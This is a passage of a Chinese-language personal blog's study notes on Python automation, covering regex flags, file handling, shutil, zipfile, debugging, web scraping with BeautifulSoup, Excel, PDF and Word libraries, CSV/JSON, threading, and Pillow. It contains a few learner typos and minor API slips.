re.compile(r&#39;.at&#39;)&gt;&gt;&gt; atRegex.findall(&#39;The cat in the hat sat on the flat mat.&#39;)[&#39;cat&#39;, &#39;hat&#39;, &#39;sat&#39;, &#39;lat&#39;, &#39;mat&#39;]# 因为.只匹配一个字符,所以flat只匹配了lat</code></pre><p><strong>用点-星匹配所有字符</strong></p><p><code>.*</code>表示”任意文本”</p><p>点-星使用“贪心”模式：它总是匹配尽可能多的文本。要用“非贪心”模式匹配所有文本，就使用点-星和问号,问号告诉 Python 用非贪心模式匹配<code>.*?</code></p><p><strong>用句点字符匹配换行</strong></p><p>点-星将匹配除换行外的所有字符。通过传入 <code>re.DOTALL</code> 作为 re.compile()的第二个参数，可以让句点字符匹配所有字符，包括换行字符</p><p><img src="https://i.loli.net/2020/02/07/s6MokGFZR9WtSOf.png" alt></p><p><strong>不区分大小写的匹配</strong></p><p>向 re.compile()传入 <code>re.IGNORECASE</code> 或 <code>re.I</code>，作为第二个参数.</p><p><strong>用<code>sub()</code>方法替换字符串</strong></p><p><code>sub()</code>方法需要传入两个参数,第一个参数是一个字符串,用于取代发现的匹配,第二个参数是一个字符串,即正则表达式.</p><p>向 re.compile()传入变量 <code>re.VERBOSE</code>，作为第二个参数,从而忽略字符串中的空白符和注释</p><p><strong>组合使用 re.IGNOREC ASE、re.DOTALL 和 re.VERBOSE</strong></p><p><code>re.compile()</code> 函数只接受一个值作为第二个参数,但是可以用<code>|</code>将变量组合起来,从而绕过这个限制,这个管道字符在这里称为”<strong>按位或</strong>“</p><h1 id="0x08-读写文件"><a href="#0x08-读写文件" class="headerlink" title="0x08    读写文件"></a>0x08    读写文件</h1><p>在 Windows 上，路径书写使用倒斜杠作为文件夹之间的分隔符</p><p>但在 OS X 和Linux 上，使用正斜杠作为它们的路径分隔符</p><p><code>os.path.join()</code> 函数用于创建文件名的字符串.</p><pre><code>&gt;&gt;&gt; os.path.join(&#39;usr&#39;,&#39;bin&#39;,&#39;spam&#39;)&#39;usr\\bin\\spam&#39; # 两个\是因为其中一个用用于转义</code></pre><p><code>os.getcwd()</code>函数可以取得当前工作路径的字符串,并且可以利用<code>os.chdir()</code>改变</p><p><strong>绝对路径和相对路径</strong></p><ul><li>“绝对路径”，总是从根文件夹开始</li><li>“相对路径”，它相对于程序的当前工作目录</li></ul><p><code>.</code>代表当前目录,<code>..</code>表示父目录</p><p><strong>用<code>os.makedirs()</code>创建新文件夹</strong></p><p><strong><code>os.path</code>模块</strong></p><p>os.path 模块包含了许多与文件名和文件路径相关的有用函数</p><p>因为os.path 是 os 模块中的模块,所以值要执行 import os 就可以导入了</p><p>调用<code>os.path.abspath(path)</code>将返回参数的绝对路径的字符串。这是将相对路径转换为绝对路径的简便方法</p><p>调用<code>os.path.isabs(path)</code>，如果参数是一个绝对路径，就返回 True，如果参数是一个相对路径，就返回 False</p><p>调用<code>os.path.relpath(path, start)</code>将返回从 start 路径到 path 的相对路径的字符串.<strong>如果没有提供 start，就使用当前工作目录作为开始路径</strong></p><p>调用<code>os.path.dirname(path)</code>将返回一个字符串，它包含 path 参数中最后一个斜杠之前的所有内容</p><p>调用<code>os.path.basename(path)</code>将返回一个字符串，它包含 path 参数中最后一个斜杠之后的所有内容</p><p>如果同时需要一个路径的目录名称和基本名称，就可以调用 <code>os.path.split()</code>，获得这两个字符串的元组</p><p><strong>查看文件大小和文件夹内容</strong></p><p>调用<code>os.path.getsize(path)</code>将返回 path 参数中文件的字节数</p><p>调用<code>os.listdir(path)</code>将返回文件名字符串的列表，包含 path 参数中的每个文件</p><p><strong>检查路径有效性</strong></p><p>如果你提供的路径不存在，许多 Python 函数就会崩溃并报错.<code>os.path</code> 模块提供了一些函数，用于检测给定的路径是否存在，以及它是文件还是文件夹</p><p>如果 path 参数所指的文件或文件夹存在，调用 <code>os.path.exists(path)</code>将返回 True，否则返回 False</p><p>如果 path 参数存在，并且是一个文件，调用 <code>os.path.isfile(path)</code>将返回 True，否则返回 False</p><p>如果 path 参数存在，并且是一个文件夹，调用 <code>os.path.isdir(path)</code>将返回 True，否则返回 False</p><p><strong>文件读写过程</strong></p><p>1．调用 open()函数，返回一个 File 对象</p><p>2．调用 File 对象的 read()或 write()方法</p><p>3．调用 File 对象的 close()方法，关闭该文件</p><p><strong>用<code>oepn()</code> 函数打开文件</strong></p><p>要用 open()函数打开一个文件，就要向它传递一个字符串路径，表明希望打开的文件。这既可以是绝对路径，也可以是相对路径</p><p>这些命令都将以读取纯文本文件的模式打开文件，或简称为“读模式”.可以向<code>open()</code>函数传入第二个参数<code>r</code>这和默认的open一样,只读</p><p><strong>读取文件内容</strong></p><p>有了File 对象,就可以读取内容了,用<code>read()</code>方法将整个文件的内容读取为字符串值.<code>readlines()</code>方法,从该文件取得一个字符串的列表.</p><p><strong>写入文件</strong></p><p>需要以“写入纯文本模式”或“添加纯文本模式”打开该文件，或简称为“写模式”和“添加模式”。</p><p>写模式将覆写原有的文件，从头开始，就像你用一个新值覆写一个变量的值。将<strong>‘w’作为第二个参数传递给 open()</strong>，以写模式打开该文件</p><blockquote><p><strong>添加模式将在已有文件的末尾添加文本</strong></p></blockquote><p><strong>将’a’ 作为第二个参数传递给open()</strong></p><p>如果传递给 open()的文件名不存在，写模式和添加模式都会创建一个新的空文件。<code>在读取或写入文件后，调用 close()方法，然后才能再次打开该文件</code></p><blockquote><p>write()方法不会像 print()函数那样，在字符串的末尾自动添加换行字符,必须自己添加该字符</p></blockquote><p><strong>用<code>shelve</code> 模块保存变量</strong></p><p>该模块可以将程序中的变量保存到二进制的shelf文件中.可以在程序中添加”保存”和”打开”功能.</p><p>shelf 值不必用读模式或写模式打开，因为它们在打开后，既能读又能写.</p><p>shelf 值有 keys() 和 value()方法,返回 shelf 中键和值的类似列表的值.因为这知识类似列表的值,所以可以使用<code>list()</code>方法,得到列表形式.</p><p><strong>用 pprint.pformat()函数保存变量</strong></p><h1 id="0x09-组织文件"><a href="#0x09-组织文件" class="headerlink" title="0x09    组织文件"></a>0x09    组织文件</h1><p><strong><code>shutil</code> 模块</strong></p><p>shutil(shell 工具)  模块中包含了一些函数,可以在python 程序中复制,移动,改名和删除文件.</p><p><code>shutil.copy(source,destination)</code> 将路径source 处的<strong>文件</strong>复制到路径 destination 处的文件夹. 如果 destination 是一个文件名,他将作为被复制文件的新名字.</p><p>函数会返回字符串,表示被复制文件的路径</p><p>shutil.copy()将复制一个文件，<code>shutil.copytree()</code>将复制整个文件夹，以及它包含的文件夹和文件。调用 <code>shutil.copytree(source, destination)</code>，将路径 source 处的<strong>文件夹</strong>，包括它的所有文件和子文件夹，复制到路径 destination 处的文件夹。source 和destination 参数都是字符串。该函数返回一个字符串，是新复制的文件夹的路径</p><p><strong>文件和文件夹的移动与改名</strong></p><p><code>shutil.move(source,destination)</code>, 将路径 source 出的文件夹移动到 destination,返回新位置的绝对路径的字符串</p><blockquote><p>如果destination 指向一个文件夹, source 文件将移动到 destination 中, 并保持原来的文件名.</p></blockquote><p> <strong>永久删除文件和文件夹</strong></p><p>利用<code>os&#39;</code>模块中的函数,可以删除一个文件或一个空文件夹.</p><p>利用<code>shutil</code>模块,可以删除一个文件夹及其所有的内容</p><p><code>os.unlink(path)</code> 将删除 path 处的文件</p><p><code>os.rmdir(path)</code>删除 path 处的 文件夹<strong>,该文件夹必须为空</strong></p><p><code>shutil.retree(path)</code>将删除 path 处的文件夹,它包含的所有文件和文件夹都会被删除</p><p>用<code>send2trash</code> 模块安全地删除</p><p>第三方的 send2trash 模块,会将文件夹和文件发送到计算机的垃圾箱,回收站,而不是永久删除.</p><p><strong>遍历目录树</strong></p><p><code>os.walk()</code> 函数被传入一个字符串值, 即一个文件夹的路径,在<code>for</code>循环中使用<code>os.walk()</code> 函数,遍历目录树</p><p><code>os.walk()</code> 在循环的每次迭代中,返回3 个值</p><ol><li>当前<strong>文件夹名称的</strong>字符串</li><li>当前文件夹中<strong>子文件夹的</strong>字符串的列表</li><li>当前文件夹中<strong>文件的</strong>字符串的列表</li></ol><p><strong>用 <code>zipfile</code> 模块压缩文件</strong></p><p>将多个文件打包成一个文件,这个文件叫做”归档文件”. </p><p>创建一个<code>ZipFile</code>对象就需要调用<code>zipfile.ZipFle()</code>函数.</p><blockquote><p>ZipFile 对象有一个 namelist()方法，返回 ZIP 文件中包含的所有文件和文件夹的字符串的列表。这些字符串可以传递给 ZipFile 对象的 getinfo()方法，返回一个关于特定文件的 ZipInfo 对象。ZipInfo 对象有自己的属性，诸如表示字节数的 file_size和 compress_size，它们分别表示原来文件大小和压缩后文件大小。ZipFile 对象表示整个归档文件，而 ZipInfo 对象则保存该归档文件中每个文件的有用信息</p></blockquote><p>ZipFile对象的<code>extractall()</code>方法从ZIP文件中解压缩所有的文件和文件,放到当前工作目录中</p><p><strong>创建和添加到ZIP文件</strong></p><p>以”写模式” 打开 ZipFile 对象,即传入’w’作为第二个参数</p><h1 id="0x10-调试"><a href="#0x10-调试" class="headerlink" title="0x10    调试"></a>0x10    调试</h1><p><strong>抛出异常</strong></p><p>前面学习了用 try 和except 来处理异常.</p><p>抛出异常使用 raise 语句</p><ul><li>raise 关键字</li><li>对 Exception 函数的调用</li><li>传递给 Exception 函数的字符串,包含有用的错误信息</li></ul><p><strong>取得反向跟踪的字符串</strong></p><blockquote><p>如果 Python 遇到错误，它就会生成一些错误信息，称为“反向跟踪”。反向跟踪包含了出错消息、导致该错误的代码行号，以及导致该错误的函数调用的序列。这个序列称为“调用栈”</p></blockquote><p>从下往上(反向)追踪</p><p><strong>断言</strong></p><p>“断言”是一个心智正常的检查，<strong>确保代码没有做什么明显错误的事情</strong>.这些心智正常的检查由 assert 语句执行.如果检查失败，就会抛出异常.在代码中，assert</p><p>语句包含以下部分：</p><p>• assert 关键字；</p><p>• 条件（即求值为 True 或 False 的表达式）；</p><p>• 逗号；</p><p>• <strong>当条件为 False 时显示的字符串</strong></p><blockquote><p>在运行py时,传入<code>-O</code>选项,可以禁用断言.</p></blockquote><p><strong>日志</strong></p><p>日志模块 <code>logging</code> 在程序运行时,将日志信息显示在屏幕上</p><p><strong>禁用日志</strong></p><p>函数 <code>logging.disable()</code></p><p><strong>断点</strong></p><p>“断点”可以设置在特定的代码行上，当程序执行到达该行时，它迫使调试器暂停</p><h1 id="0x11-从-Web-抓取信息-是重点"><a href="#0x11-从-Web-抓取信息-是重点" class="headerlink" title="0x11    从 Web 抓取信息(是重点!)"></a>0x11    从 Web 抓取信息(是重点!)</h1><p>主要是三个模块</p><p>webbrowser requests BeautifulSoup selenium</p><p>我之前也学习过这部分的内容</p><p><a href="http://hack-for.fun/2019/12/04/Python%20re%20,%20request%20%E5%BA%93%E4%BD%BF%E7%94%A8/">Python request 和 re </a></p><p>用标准的open()和wirte()方法,可以将Web 页面保存到文件中,保存在当前工作目录</p><p>必须使用”写二进制”模式打开该文件,即向函数传入字符串’wb’,作为open()的第二产生.</p><p><strong>用BeatutifulSoup 模块解析 HTML</strong></p><p>导入模块<code>from bs4 import BeautifulSoup</code></p><p>获取BeautifulSoup 对象 <code>exampleSoup = bs4.BeautifulSoup(exampleFile)</code></p><p>有了对象后, 就可以利用方法来定位HTML文档中的特定部分</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> requests<span class="token punctuation">,</span> bs4<span class="token comment" spellcheck="true"># 利用requests.get()函数从博客下载主页</span><span class="token operator">>></span><span class="token operator">></span> res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://hack-for.fun'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> res<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建一个BeautifulSoup对象</span><span class="token operator">>></span><span class="token operator">></span> noStarchSoup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>noStarchSoup<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bs4.BeautifulSoup'</span><span class="token operator">></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> exampleFile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'example.html'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 向bs4.BeautifulSoup() 传递一个File对象,从硬盘中加载HTML文件</span><span class="token operator">>></span><span class="token operator">></span> exampleSoup <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>exampleFile<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>exampleSoup<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bs4.BeautifulSoup'</span><span class="token operator">></span></code></pre><p>用<code>select()</code>方法寻找元素</p><pre><code>soup.select(&#39;div&#39;) 所有名为&lt;div&gt;的元素soup.select(&#39;#author&#39;) 带有 id 属性为 author 的元素soup.select(&#39;.notice&#39;) 所有使用 CSS class 属性名为 notice 的元素soup.select(&#39;div span&#39;) 所有在&lt;div&gt;元素之内的&lt;span&gt;元素soup.select(&#39;div &gt; span&#39;) 所有直接在&lt;div&gt;元素之内的&lt;span&gt;元素，中间没有其他元素soup.select(&#39;input[name]&#39;) 所有名为&lt;input&gt;，并有一个 name 属性，其值无所谓的元素soup.select(&#39;input[type=&quot;button&quot;]&#39;) 所有名为&lt;input&gt;，并有一个 type 属性，其值为 button 的元素</code></pre><p>select()方法将返回一个Tag对象的列表,这是BeautifulSoup表示一个HTML元素的方式</p><p>Tag 值可以传递给str()函数,显示他们的HTML标签.Tag 值也可以有<code>attrs</code>属性,它将Tag 的所有HTML属性作为一个字典</p><p>在每个元素上使用<code>getText()</code> 可以显示文本</p><p>Tag 对象的 get()方法让我们很容易从元素中获取属性值。<strong>向该方法传入一个属性名称的字符串，它将返回该属性的值</strong></p><p>查看<code>&lt;a&gt;</code> 这个元素向上看,<code>&lt;h3 class=&quot;r&quot;&gt;</code> 说明,<code>r类</code>仅用于查询结果链接</p><p>用<code>selenium</code> 模块控制浏览器</p><p>详细内容跳过</p><h1 id="0x12-处理Excel电子表格"><a href="#0x12-处理Excel电子表格" class="headerlink" title="0x12    处理Excel电子表格"></a>0x12    处理Excel电子表格</h1><p>使用<code>openpyxl</code> 模块可以让 Python程序能读取和修改Excel 电子表格文件</p><p><strong>Excel 文档的定义</strong></p><p>一个 Excel 电子表格文档称为一个工作簿。一个工作簿保存在扩展名为.xlsx 的文件中。每个工作簿可以包含多个表（也称为工作表）用户当前查看的表( 或关闭Excel 前最后查看的表 ) , 称为活动表.</p><p>每个表都有一些列（地址是从 A 开始的字母）和一些行（地址是从 1 开始的数字）。在特定行和列的方格称为单元格。每个单元格都包含一个数字或文本值。单元格形成的网格和数据构成了表</p><p><strong>用 openpyxl 模块打开 Excel 文档</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> openpyxlwb <span class="token operator">=</span> openpyxl<span class="token punctuation">.</span>load_workbook<span class="token punctuation">(</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span></code></pre><p>函数接受文件名, 返回一个 workbook 数据类型的值</p><p>调用 <code>get_sheet_names()</code>方法可以取得工作簿中所有表名的列表,每个表由一个 Worksheet 对象表示</p><p>可以通过向工作簿方法 <code>get_sheet_by_name()</code>传递表名字符串获得.最后，可以调用 Workbook 对象的 <code>get_active_sheet()</code>方法，取得工作簿的活动表</p><p><strong>从表中取得单元格</strong></p><p>有了 Worksheet 对象后，就可以按名字访问 Cell 对象.</p><p>Cell 对象有一个 value 属性，不出意外，它包含这个单元格中保存的值。Cell 对象也有 row、column 和 coordinate 属性，提供该单元格的位置信息</p><p>可以通过 Worksheet 对象的 <code>get_highest_row()</code>和 <code>get_highest_column()</code>方法(返回一个整数,而不是出现的字母)，确定表的大小</p><p><strong>列字母和数字之间的转换</strong></p><p>要从字母转换到数字，就调用 <code>openpyxl.cell.column_index_from_string()</code>函数</p><p>要从数字转换到字母，就调用 <code>openpyxl.cell.get_column_letter()</code>函数</p><p><strong>从表中取得行和列</strong></p><p>可以将 Worksheet 对象切片，取得电子表格中一行、一列或一个矩形区域中的所有Cell 对象.然后可以循环遍历这个切片中的所有单元格</p><p>流程</p><p>1．导入 openpyxl 模块。</p><p>2．调用 openpyxl.load_workbook()函数。</p><p>3．取得 Workbook 对象。</p><p>4．调用 get_active_sheet()或 get_sheet_by_name()工作簿方法。</p><p>5．取得 Worksheet 对象。</p><p>6．使用索引或工作表的 cell()方法，带上 row 和 column 关键字参数。</p><p>7．取得 Cell 对象。</p><p>8．读取 Cell 对象的 value 属性。</p><p>调用 <code>openpyxl.Workbook()</code>函数，创建一个新的空 Workbook 对象</p><p>利用<code>create_sheet() and remove_sheet()</code>方法，可以在工作簿中添加或删除工作表</p><p><code>create_sheet()</code>方法返回一个新的 Worksheet 对象，名为 SheetX，它默认是工作簿的最后一个工作表。或者，可以利用 index 和 title 关键字参数，指定新工作表的索引或名称</p><p>为了定义单元格的字体风格，需要从 <code>openpyxl.styles</code>模块导入<code>Font()和 Style()</code>函数</p><p><code>from openpyxl.styles import Font, Style</code></p><p><strong>Font 对象</strong></p><p>Font 对象的 style 属性影响文本在单元格中的显示方式。要设置字体风格属性，就向 Font()函数传入关键字参数</p><p>后面的内容跳过了</p><h1 id="0x13-处理-PDF-和-Word-文档"><a href="#0x13-处理-PDF-和-Word-文档" class="headerlink" title="0x13    处理 PDF 和 Word 文档"></a>0x13    处理 PDF 和 Word 文档</h1><p>PDF 和 Word 文档是<strong>二进制文件</strong>，所以它们比纯文本文件要复杂得多</p><p>PDF 表示 Portable Document Format，使用<code>.pdf</code> 文件扩展名</p><p>模块<code>PyPDF2</code> 用于处理PDF</p><p>PyPDF2 没有办法从 PDF 文档中提取图像、图表或其他媒体，但它可以提取文本，并将文本返回为 Python 字符串</p><p>*<em>解密 PDF *</em></p><p> 所有 PdfFileReader 对象都有一个 isEncrypted 属性，如果 PDF 是加密的，它就是 True，如果不是，它就是 False</p><p>调用<code>decrypt()</code> 函数, 传入口令字符串,就可以读取加密的PDF(可以爆破了)</p><p><strong>加密 PDF</strong></p><p><code>PdfFileWriter</code> 对象也可以为PDF文档进行加密.</p><p>在调用 write()方法保存文件之前，调用 encrypt()方法，传入口令字符串</p><p><strong>创建PDF</strong></p><p>在 PyPDF2 中，与 PdfFileReader 对象相对的是 PdfFileWriter 对象，它可以创建一个新的 PDF 文件</p><p>PyPDF2 写入 PDF 的能力，仅限于从其他 PDF 中拷贝页面、旋转页面、重叠页面和加密文件</p><p>1．打开一个或多个已有的 PDF（源 PDF），得到 PdfFileReader 对象</p><p>2．创建一个新的 PdfFileWriter 对象</p><p>3．将页面从 PdfFileReader 对象拷贝到 PdfFileWriter 对象中</p><p>4．最后，利用 PdfFileWriter 对象写入输出的 PDF</p><p><strong>叠加页面</strong></p><p>生成<code>PdfFileReader</code> 对象,调用<code>getPage(0)</code> 取得第一页的 Page 对象.</p><hr><p><strong>Word 文档</strong></p><p><code>docx</code>模块 可以创建和修改 Word 文档,<code>.docx</code>文件的扩展名</p><p>打开<code>.docx</code> 文件, 调用 <code>docx.Document()</code>,参数为文件名,返回 Document 对象,有 paragraphs 属性,是Paragraph 对象的列表.</p><p><strong>从.docx 文件中取得完整的文本</strong></p><p>调用<code>getText()</code>函数,接受的参数为 <code>.docx</code> 文件名,返回其中文本的字符串</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">getText</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>doc <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>fullText <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> para <span class="token keyword">in</span> doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>fullText<span class="token punctuation">.</span>append<span class="token punctuation">(</span>para<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>fullText<span class="token punctuation">)</span></code></pre><p><code>getText()</code>函数打开 Word文档,循环遍历 paragraphs 列表中的所有 Paragraph对象，然后将它们的文本添加到 fullText 列表中。循环结束后，fullText 中的字符串连接在一起，中间以换行符分隔</p><p><strong>Run 属性</strong></p><table><thead><tr><th align="center">bold</th><th align="center">文本以粗体出现</th></tr></thead><tbody><tr><td align="center">italic</td><td align="center">文本以斜体出现</td></tr><tr><td align="center">underline</td><td align="center">文本带下划线</td></tr><tr><td align="center">strike</td><td align="center">文本带删除线</td></tr><tr><td align="center">double_strike</td><td align="center">文本带双删除线</td></tr><tr><td align="center">all_caps</td><td align="center">文本以大写首字母出现</td></tr></tbody></table><p>等.</p><p>更多的,我觉得还是遇见了再说吧~</p><h1 id="0x14-处理CSV文件和JSON数据"><a href="#0x14-处理CSV文件和JSON数据" class="headerlink" title="0x14    处理CSV文件和JSON数据"></a>0x14    处理CSV文件和JSON数据</h1><p>CSV 和 JSON 文件是纯文本文件.CVS 表示”Comma-Separated Values(逗号分隔的值)”.CVS文件是简化的电子表格,保存为纯文本文件.</p><p>JSON,以 JavaScript 源代码的形式,将信息保存在纯文本文件中.</p><p><strong>csv 模块</strong></p><p>CSV 文件中的每行代表电子表格中的一行, 逗号分隔了该行中的单元格.</p><p>CSV文件中: </p><p>• 值没有类型，所有东西都是字符串</p><p>• 没有字体大小或颜色的设置</p><p>• 没有多个工作表</p><p>• 不能指定单元格的宽度和高度</p><p>• 不能合并单元格</p><p>• 不能嵌入图像或图表</p><p>CSV 格式和它声称的完全一致：<strong>它就是一个文本文件，具有逗号分隔的值</strong></p><p>要用 csv 模块从 CSV 文件中读取数据，需要创建一个 Reader 对象</p><p><strong>Reader 对象让你迭代遍历 CSV 文件中的每一行</strong></p><p>csv 模块是Python 自带的,不需要安装</p><p>首先用<code>open()</code> 函数打开 要读取的 csv 文件.然后将值传递给<code>csv.reader()</code> 函数.这将返回一个 Reader 对象</p><p>要访问 Reader 对象中的值, 最直接的方法是将它转换成一个普通的 Python 列表, 即传递给 list()</p><p><strong>在 for 循环中，从 Reader 对象读取数据</strong></p><p>循环遍历 Reader 对象中的行,每一行是一个值的列表,每个值表示一个单元格</p><p><strong>Writer 对象</strong></p><p>可以写入数据进入 CSV 文件. 创建 Writer 对象, 使用<code>csv.writer()</code> 函数</p><p>在 Windows 上，需要为 open()函数的 newline 关键字参数传入一个空字符串</p><p>Writer 对象的 writerow()方法接受一个列表参数。列表中的每个词，放在输出的</p><p>CSV 文件中的一个单元格中。writerow()函数的返回值，是写入文件中这一行的字符数（包括换行字符</p><p><strong>delimiter 和 lineterminator 关键字参数</strong> </p><p>利用 csv.writer()的 delimiter 和 lineterminator关键字参数，将终止符改成不同的值</p><hr><p><strong>JSON 和 API</strong> </p><p>很多网站都提供 JSON 格式的内容，作为程序与网站交互的方式。这就是所谓的提供“应用程序编程接口（API）,访问 API 和 通过URL访问任何其他网页是一样的.</p><p>API 返回的数据是针对机器格式化的（例如用 JSON），API 不是人容易阅读的</p><p>python 的 json 模块处理了 JSON 数据字符串和 Python 值之间转换的所有细节，得到了 <code>json.loads()</code>和 <code>json.dumps()</code>函数</p><p>JSON 只能包含的数据类型: 字符串、整型、浮点型、布尔型、列表、字典和 NoneType</p><p>不能表示的数据类型: File 对象、CSV Reader 或 Writer 对象、Regex对象或 Selenium WebElement 对象</p><p><strong><code>loads()</code> 函数读取 JSON</strong></p><p><code>json.loads()</code>函数, 将 JSON数据转换为 Python 值(load string)</p><blockquote><p>JSON 字符串总是用双引号</p></blockquote><p>函数返回Python 字典.</p><p><strong>用 <code>dumps()</code> 函数写出 JSON</strong></p><p>该值只能是以下基本 Python 数据类型之一：字典、列表、整型、浮点型、字符串、布尔型或 None</p><p><code>%s</code> 表示占位符,</p><h1 id="0x15-保持时间-计划任务和启动程序"><a href="#0x15-保持时间-计划任务和启动程序" class="headerlink" title="0x15    保持时间,计划任务和启动程序"></a>0x15    保持时间,计划任务和启动程序</h1><p><code>time</code> 和 <code>datetime</code> 提供了时间相关的函数,<code>subprocess</code> 和 <code>threading</code> 模块 可以按时启动</p><p><strong>time 模块</strong></p><p><code>time.time()</code> 函数返回自那一刻以来的秒数,是一个浮点数.这个数字称为 UNIX 纪元时间戳,</p><p>Unix 纪元是编程中常参考的时间, 1970 年 1 月 1 日 0点,即<strong>协调世界时 (UTC)</strong></p><p><code>time.sleep()</code>函数</p><p>让程序暂停,就需要调用这个函数,传入希望程序暂停的秒数2</p><p>数字四舍五入</p><p><code>round()</code> 函数 将一些长的数字缩短.,按照指定的精度四舍五入到一个浮点数,如果省略第二个参数,round()函数将数字四舍五入到最接近的整数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> timenowtime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>nowtime<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>round<span class="token punctuation">(</span>nowtime<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>打印的结果<span class="token punctuation">:</span> <span class="token number">1581219302.716289</span><span class="token number">1581219302.72</span><span class="token number">1581219303</span></code></pre><p><strong><code>datetime</code> 模块</strong></p><p>time 模块用于取得 Unix 纪元时间戳,为了方便可读的需要使用<code>datetime</code> 模块</p><p>调用<code>datetime.datetime.now()</code>返回一个datetime 对象,表示当前的时期和时间</p><p>Unix 纪元时间戳 可以通过<code>datetime.datetime.fromtimestamp()</code> 转换为datetime 对象</p><p><strong><code>timedelta</code> 数据类型</strong></p><p>datetime 模块还提供了 timedelta 数据类型，<strong>它表示一段时间，而不是一个时刻</strong></p><p>创建 timedelta 对象, 就用 <code>datetime.timedelta()</code> 函数,</p><p>接受关键字参数 weeks、days、hours、minutes,seconds、milliseconds 和 microseconds</p><p>将 timedelta 对象返回传入 <code>str()</code> ,使人可读</p><p>利用<code>strftime()</code> 方法,可以将 datetime 对象显示为字符串</p><p>利用<code>datetime.datetime.strftime()</code>函数可以将字符串换成 datetime 对象</p><p><strong>多线程</strong></p><p><code>threading</code> 模块,可在单独的线程中执行延迟或安排的代码.</p><p>要得到单独的线程，首先要调用 <code>threading.Thread()</code>函数，生成一个<code>Thread 对象</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start of program."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">takeaNap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wake up!'</span><span class="token punctuation">)</span>threadObj <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>takeaNap<span class="token punctuation">)</span>threadObj<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用时, takeaNap 在一个新线程中,主线程继续执行,当执行了time.sleep(5)后,打印结果,新线程结束</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'End of program'</span><span class="token punctuation">)</span>程序的输出<span class="token punctuation">:</span> Start of program<span class="token punctuation">.</span>End of programWake up!</code></pre><p><strong>常规参数可以作为一个列表，传递给 threading.Thread()中的 args 关键字参数</strong></p><p><strong>关键字参数可以作为一个字典，传递给 threading.Thread()中的 kwargs 关键字参数</strong></p><pre><code>&gt;&gt;&gt; import threading&gt;&gt;&gt; threadObj = threading.Thread(target=print, args=[&#39;cats&#39;, &#39;dogs&#39;, &#39;fogs&#39;],kwargs={&#39;sep&#39;: &#39;&amp;&#39;})&gt;&gt;&gt; threadObj.start() # 调用时会创建一个新线程来调用print()cats&amp;dogs&amp;fogs</code></pre><p><strong>用python启动其他程序</strong></p><p><code>subprocess</code> 模块中的<code>Popen() 函数</code> P 表示 process,进程.</p><p>每个进程可以有多个线程.</p><p>将要运行的 外部程序的文件名传递给<code>subprocess.Popen()</code> 函数.在Windows 中通过查看”属性”, 查看应用程序的文件名.</p><p>在 OS X上,Ctrl 键单击应用程序并选择”显示包尼尔” 找到可执行文件的路径</p><p><strong>运行其他 Python 脚本</strong></p><p>只需要向<code>Popen()</code> 传入 python.exe可执行文件,并将想运行的<code>.py</code> 文件名作为参数</p><h1 id="0x16-操作图像"><a href="#0x16-操作图像" class="headerlink" title="0x16    操作图像"></a>0x16    操作图像</h1><p> 模块<code>PIL</code>可以用于处理图像文件</p><p>计算机程序通常将图像中的颜色表示为 RGBA 值。RGBA 值是一组数字，指定顔色中的红、绿、蓝和 alpha（透明度）的值。这些值是从 0（根本没有）到 255（最高）的整数</p><p>Pillow 提供 <code>ImageColor.getcolor()</code>函数，所以你不必记住想用的顔色的 RGBA 值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageColor<span class="token keyword">print</span><span class="token punctuation">(</span>ImageColor<span class="token punctuation">.</span>getcolor<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">,</span> <span class="token string">'RGBA'</span><span class="token 